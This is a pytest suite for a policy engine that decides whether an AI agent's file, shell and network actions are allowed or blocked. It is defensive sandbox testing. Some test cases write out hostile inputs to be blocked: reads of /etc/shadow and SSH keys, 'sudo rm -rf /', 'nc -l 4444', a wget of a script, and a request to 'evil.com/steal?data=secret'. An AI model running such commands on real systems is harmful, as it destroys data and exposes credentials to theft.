"""
Test Suite — Policy Engine
============================
Automated tests for the access-matrix policy engine.
Run with: python -m pytest tests/ -v
"""

import os
import sys
import pytest

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.policy_engine.engine import PolicyEngine


@pytest.fixture
def engine():
    """Create a PolicyEngine instance for testing."""
    return PolicyEngine()


class TestFilesystemReadRules:
    """Test filesystem read access rules."""

    def test_allow_tmp_read(self, engine):
        assert engine.check("read_file", "/tmp/test.txt") == "ALLOW"

    def test_block_etc_shadow(self, engine):
        assert engine.check("read_file", "/etc/shadow") == "BLOCK"

    def test_block_etc_passwd(self, engine):
        assert engine.check("read_file", "/etc/passwd") == "BLOCK"

    def test_block_ssh_key(self, engine):
        assert engine.check("read_file", "/home/user/.ssh/id_rsa") == "BLOCK"

    def test_block_bash_history(self, engine):
        assert engine.check("read_file", "/home/user/.bash_history") == "BLOCK"


class TestFilesystemWriteRules:
    """Test filesystem write access rules."""

    def test_allow_tmp_write(self, engine):
        assert engine.check("write_file", "/tmp/output.txt") == "ALLOW"

    def test_block_etc_write(self, engine):
        assert engine.check("write_file", "/etc/crontab") == "BLOCK"

    def test_block_usr_write(self, engine):
        assert engine.check("write_file", "/usr/bin/evil") == "BLOCK"


class TestProcessRules:
    """Test shell command execution rules."""

    def test_allow_ls(self, engine):
        assert engine.check("run_shell", "ls /tmp") == "ALLOW"

    def test_allow_cat_safe(self, engine):
        assert engine.check("run_shell", "cat /tmp/safe.txt") == "ALLOW"

    def test_block_curl(self, engine):
        assert engine.check("run_shell", "curl http://evil.com") == "BLOCK"

    def test_block_wget(self, engine):
        assert engine.check("run_shell", "wget http://malware.com/bad.sh") == "BLOCK"

    def test_block_sudo(self, engine):
        assert engine.check("run_shell", "sudo rm -rf /") == "BLOCK"

    def test_block_chmod(self, engine):
        assert engine.check("run_shell", "chmod 777 /etc/passwd") == "BLOCK"

    def test_block_nc(self, engine):
        assert engine.check("run_shell", "nc -l 4444") == "BLOCK"

    def test_block_ssh(self, engine):
        assert engine.check("run_shell", "ssh user@remote") == "BLOCK"

    def test_block_cat_shadow(self, engine):
        """cat is allowed but /etc/shadow is blocked — should BLOCK."""
        assert engine.check("run_shell", "cat /etc/shadow") == "BLOCK"


class TestNetworkRules:
    """Test network access rules."""

    def test_block_all_network(self, engine):
        assert engine.check("http_request", "http://example.com") == "BLOCK"

    def test_block_evil_network(self, engine):
        assert engine.check("http_request", "http://evil.com/steal?data=secret") == "BLOCK"


class TestTextResponses:
    """Test that text-only responses are always allowed."""

    def test_allow_text_response(self, engine):
        assert engine.check("respond", "Hello, how can I help?") == "ALLOW"

    def test_allow_any_text(self, engine):
        assert engine.check("respond", "I cannot access that file.") == "ALLOW"


class TestPolicyHash:
    """The policy file's identity is exposed so benchmark results can be stamped with it."""

    def test_policy_hash_matches_file(self):
        import hashlib
        from src.policy_engine.engine import DEFAULT_POLICY
        engine = PolicyEngine(verbose=False)
        with open(DEFAULT_POLICY, 'rb') as f:
            assert engine.policy_sha256 == hashlib.sha256(f.read()).hexdigest()
        assert engine.policy_path == os.path.abspath(DEFAULT_POLICY)
